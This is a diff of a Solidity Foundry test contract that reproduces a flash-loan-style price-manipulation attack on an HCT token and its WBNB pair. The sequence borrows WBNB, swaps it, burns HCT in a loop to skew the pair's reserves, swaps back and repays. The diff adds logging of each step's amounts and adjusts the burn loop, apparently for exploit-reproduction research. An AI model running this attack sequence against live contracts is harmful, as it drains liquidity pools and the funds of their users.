@@ -168,8 +168,7 @@ contract HCTTestBase is Test, BlockLoader {
     }
 
     function burn_hct_pair(uint256 amount) internal eurus {
-        uint256 initBalance = hct.balanceOf(address(attacker));
-        while (hct.balanceOf(address(attacker)) > initBalance - amount) {
+        while (hct.balanceOf(address(attacker)) > amount) {
             hct.burn((hct.balanceOf(address(attacker)) * 8) / 10 - 1);
         }
         pair.sync();
@@ -177,21 +176,35 @@ contract HCTTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2200 * 1e18);
         borrow_wbnb_owner(2200 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
+                100
+        );
         swap_pair_attacker_wbnb_hct(
             wbnb.balanceOf(attacker),
             (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
                 100
         );
         printBalance("After step1 ");
-        burn_hct_pair(hct.balanceOf(attacker) - 70);
+        emit log_named_uint("amt3", 70);
+        burn_hct_pair(70);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", hct.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(hct.balanceOf(attacker), address(hct))
+        );
         swap_pair_attacker_hct_wbnb(
             hct.balanceOf(attacker),
             pair.getAmountOut(hct.balanceOf(attacker), address(hct))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 2200 * 1e18);
         payback_wbnb_owner(2200 * 1e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -214,7 +227,7 @@ contract HCTTestBase is Test, BlockLoader {
         burn_hct_pair(amt3);
         swap_pair_attacker_hct_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
